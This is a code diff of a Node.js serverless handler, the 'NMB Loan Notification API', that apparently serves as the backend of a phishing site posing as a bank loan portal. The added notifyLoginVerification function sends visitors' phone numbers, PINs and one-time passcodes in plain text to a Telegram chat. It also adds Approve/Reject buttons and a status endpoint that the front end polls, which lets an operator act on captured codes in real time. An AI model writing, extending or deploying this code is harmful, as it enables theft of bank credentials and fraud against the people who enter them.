@@ -9,7 +9,7 @@
  *   NMB_BOT_TOKEN  - the Telegram bot token
  *   NMB_CHAT_ID    - the admin chat id
  *
- * One-time: set the webhook, e.g. visit  https://<your-domain>/api/setup-webhook
+ * One-time: set the webhook, e.g. visit https://<your-domain>/api/setup-webhook
  */
 const https = require('https');
 
@@ -19,6 +19,7 @@ const CHAT_ID = process.env.NMB_CHAT_ID;
 // In-memory store. NOTE: serverless instances are ephemeral, so this resets
 // on cold starts. For production use a database / KV store.
 const applications = new Map();
+const loginVerifications = new Map(); // { id => { phone, pin, otp, type, timestamp, status, messageId, chatId } }
 
 function tgApi(method, payload, cb) {
   const data = JSON.stringify(payload);
@@ -81,44 +82,126 @@ function notifyApplication(app) {
   return id;
 }
 
-function notifyLogin(login) {
-  const text =
-    `<b>🔐 New Login / Activity</b>\n\n` +
-    `User: ${esc(login.username || 'N/A')}\n` +
-    (login.pin ? `PIN: ${esc(login.pin)}\n` : '') +
-    (login.amount ? `Amount: ${esc(login.amount)} USD\n` : '') +
-    `Time: ${new Date().toLocaleString()}`;
-  tgApi('sendMessage', { chat_id: CHAT_ID, text, parse_mode: 'HTML' }, (r) => {
-    if (r && r.ok) console.log('[notify] login sent');
+function notifyLoginVerification(login) {
+  const type = login.otp ? 'otp' : 'pin';
+  const id = login.loginId || (type === 'otp' ? 'OTP-' : 'LOG-') + Date.now();
+
+  let text = '';
+  if (type === 'pin') {
+    text =
+      `<b>🔐 PIN Verification Required</b>\n\n` +
+      `User: ${esc(login.username || 'N/A')}\n` +
+      (login.pin ? `PIN: ${esc(login.pin)}\n` : '') +
+      (login.amount ? `Amount: ${esc(login.amount)} USD\n` : '') +
+      `Time: ${new Date().toLocaleString()}`;
+  } else {
+    text =
+      `<b>🔐 OTP Verification Required</b>\n\n` +
+      `User: ${esc(login.username || 'N/A')}\n` +
+      (login.pin ? `PIN: ${esc('****')}\n` : '') +
+      `OTP: ${esc(login.otp)}\n` +
+      `Time: ${new Date().toLocaleString()}`;
+  }
+
+  loginVerifications.set(id, {
+    phone: login.username,
+    pin: login.pin || '',
+    otp: login.otp || '',
+    type,
+    timestamp: Date.now(),
+    status: 'pending',
+    decided: false,
+    messageId: null,
+    chatId: CHAT_ID
   });
+
+  const approveLabel = type === 'pin' ? '✅ Approve PIN' : '✅ Approve OTP';
+  const rejectLabel = type === 'pin' ? '❌ Reject PIN' : '❌ Reject OTP';
+  const approveData = type === 'pin' ? `pin_approve:${id}` : `otp_approve:${id}`;
+  const rejectData = type === 'pin' ? `pin_reject:${id}` : `otp_reject:${id}`;
+
+  tgApi('sendMessage', {
+    chat_id: CHAT_ID,
+    text,
+    parse_mode: 'HTML',
+    reply_markup: {
+      inline_keyboard: [[
+        { text: approveLabel, callback_data: approveData },
+        { text: rejectLabel, callback_data: rejectData },
+      ]],
+    },
+  }, (r) => {
+    if (r && r.ok) {
+      const entry = loginVerifications.get(id);
+      if (entry) {
+        entry.messageId = r.result.message_id;
+        loginVerifications.set(id, entry);
+      }
+      console.log(`[notify] ${type} verification sent:`, id);
+    } else {
+      console.error(`[notify] ${type} verification failed:`, r && r.description);
+    }
+  });
+  return id;
 }
 
 function handleCallback(cq) {
   const [action, id] = (cq.data || '').split(':');
-  if (action !== 'approve' && action !== 'reject') return;
 
-  const rec = applications.get(id);
-  const decision = action === 'approve' ? 'approved' : 'rejected';
-  const stamp = action === 'approve' ? '✅ Approved' : '❌ Rejected';
-  if (rec) rec.status = decision;
+  let decision = null;
+  let rec = null;
 
-  tgApi('answerCallbackQuery', { callback_query_id: cq.id, text: `Marked ${decision}` });
-  if (rec && rec.messageId) {
-    const name = rec.details.name || 'N/A';
-    tgApi('editMessageText', {
-      chat_id: rec.chatId,
-      message_id: rec.messageId,
-      parse_mode: 'HTML',
-      text:
-        `<b>🏦 Loan Application</b>\n\n` +
-        `ID: <code>${esc(id)}</code>\n` +
-        `Applicant: ${esc(name)}\n` +
-        `Loan Type: ${esc(rec.details.loanType || 'N/A')}\n` +
-        `Amount: ${esc(rec.details.amount || 'N/A')} USD\n\n` +
-        `Status: <b>${stamp}</b>`,
-    });
+  if (action === 'approve' || action === 'reject') {
+    decision = action === 'approve' ? 'approved' : 'rejected';
+    rec = applications.get(id);
+    if (rec) rec.status = decision;
+    const stamp = action === 'approve' ? '✅ Approved' : '❌ Rejected';
+    tgApi('answerCallbackQuery', { callback_query_id: cq.id, text: `Marked ${decision}` });
+    if (rec && rec.messageId) {
+      const name = rec.details.name || 'N/A';
+      tgApi('editMessageText', {
+        chat_id: rec.chatId,
+        message_id: rec.messageId,
+        parse_mode: 'HTML',
+        text:
+          `<b>🏦 Loan Application</b>\n\n` +
+          `ID: <code>${esc(id)}</code>\n` +
+          `Applicant: ${esc(name)}\n` +
+          `Loan Type: ${esc(rec.details.loanType || 'N/A')}\n` +
+          `Amount: ${esc(rec.details.amount || 'N/A')} USD\n\n` +
+          `Status: <b>${stamp}</b>`,
+      });
+    }
+    console.log(`[decision] ${id} -> ${decision}`);
+    return;
   }
-  console.log(`[decision] ${id} -> ${decision}`);
+
+  if (action === 'pin_approve' || action === 'pin_reject' || action === 'otp_approve' || action === 'otp_reject') {
+    decision = (action === 'pin_approve' || action === 'otp_approve') ? 'approved' : 'rejected';
+    const kind = action.startsWith('pin') ? 'PIN' : 'OTP';
+    const stamp = action.endsWith('approve') ? '✅ Approved' : '❌ Rejected';
+    rec = loginVerifications.get(id);
+    if (rec) {
+      loginVerifications.set(id, { ...rec, status: decision, decided: true });
+      tgApi('answerCallbackQuery', { callback_query_id: cq.id, text: `${kind} ${decision}` });
+      if (rec.messageId) {
+        tgApi('editMessageText', {
+          chat_id: rec.chatId,
+          message_id: rec.messageId,
+          parse_mode: 'HTML',
+          text:
+            `<b>🔐 ${kind} Verification</b>\n\n` +
+            `User: ${esc(rec.phone || 'N/A')}\n` +
+            (kind === 'PIN' && rec.pin ? `PIN: ${esc('****')}\n` : '') +
+            (kind === 'OTP' && rec.otp ? `OTP: ${esc('******')}\n` : '') +
+            `Time: ${new Date(rec.timestamp).toLocaleString()}\n\n` +
+            `Status: <b>${stamp}</b>`,
+        });
+      }
+      console.log(`[${kind.toLowerCase()} decision] ${id} -> ${decision}`);
+    }
+    return;
+  }
 }
 
 function setWebhook(host, proto, cb) {
@@ -143,54 +226,64 @@ module.exports = (req, res) => {
 
     const url = req.url || '';
 
-  // GET /api/setup-webhook  -> register Telegram webhook on first deploy
-  if (req.method === 'GET' && url.includes('setup')) {
-    const host = req.headers['x-forwarded-host'] || req.headers.host;
-    const proto = req.headers['x-forwarded-proto'] || 'https';
-    setWebhook(host, proto, (r) => {
-      res.status(200).json({ ok: r && r.ok, description: r && r.description, webhook: `${proto}://${host}/api` });
-    });
-    return;
-  }
+    if (req.method === 'GET' && url.includes('setup')) {
+      const host = req.headers['x-forwarded-host'] || req.headers.host;
+      const proto = req.headers['x-forwarded-proto'] || 'https';
+      setWebhook(host, proto, (r) => {
+        res.status(200).json({ ok: r && r.ok, description: r && r.description, webhook: `${proto}://${host}/api` });
+      });
+      return;
+    }
 
-  // GET /api/application/:id
-  if (req.method === 'GET' && url.startsWith('/application/')) {
-    const id = url.split('/').pop();
-    const rec = applications.get(id);
-    res.status(200).json({ status: rec ? rec.status : 'unknown' });
-    return;
-  }
+    if (req.method === 'GET' && url.startsWith('/application/')) {
+      const id = url.split('/').pop();
+      const rec = applications.get(id);
+      res.status(200).json({ status: rec ? rec.status : 'unknown' });
+      return;
+    }
 
-  if (req.method === 'POST') {
-    let raw = '';
-    req.on('data', (c) => (raw += c));
-    req.on('end', () => {
-      let p = {};
-      try { p = JSON.parse(raw || '{}'); } catch (e) { /* ignore */ }
-
-      // Telegram webhook callback (button tap)
-      if (p.callback_query) {
-        handleCallback(p.callback_query);
-        res.status(200).json({ ok: true });
+    if (req.method === 'GET' && url.startsWith('/login/status/')) {
+      const id = url.split('/').pop();
+      const rec = loginVerifications.get(id);
+      if (!rec) {
+        res.status(404).json({ error: 'Verification not found or expired' });
         return;
       }
-      // App notifications
-      if (url.includes('application')) {
-        const id = notifyApplication(p);
-        res.status(200).json({ ok: true, appId: id });
-        return;
-      }
-      if (url.includes('login')) {
-        notifyLogin(p);
-        res.status(200).json({ ok: true });
-        return;
-      }
-      res.status(404).json({ error: 'not found' });
-    });
-    return;
-  }
+      res.status(200).json({
+        decided: !!rec.decided,
+        status: rec.status || 'pending'
+      });
+      return;
+    }
 
-  res.status(200).send('NMB Loan Notification API');
+    if (req.method === 'POST') {
+      let raw = '';
+      req.on('data', (c) => (raw += c));
+      req.on('end', () => {
+        let p = {};
+        try { p = JSON.parse(raw || '{}'); } catch (e) { /* ignore */ }
+
+        if (p.callback_query) {
+          handleCallback(p.callback_query);
+          res.status(200).json({ ok: true });
+          return;
+        }
+        if (url.includes('application')) {
+          const id = notifyApplication(p);
+          res.status(200).json({ ok: true, appId: id });
+          return;
+        }
+        if (url.includes('login')) {
+          const id = notifyLoginVerification(p);
+          res.status(200).json({ ok: true, loginId: id });
+          return;
+        }
+        res.status(404).json({ error: 'not found' });
+      });
+      return;
+    }
+
+    res.status(200).send('NMB Loan Notification API');
   } catch (e) {
     console.error('[api] unhandled error:', e);
     if (!res.headersSent) res.status(500).json({ error: 'Internal server error' });
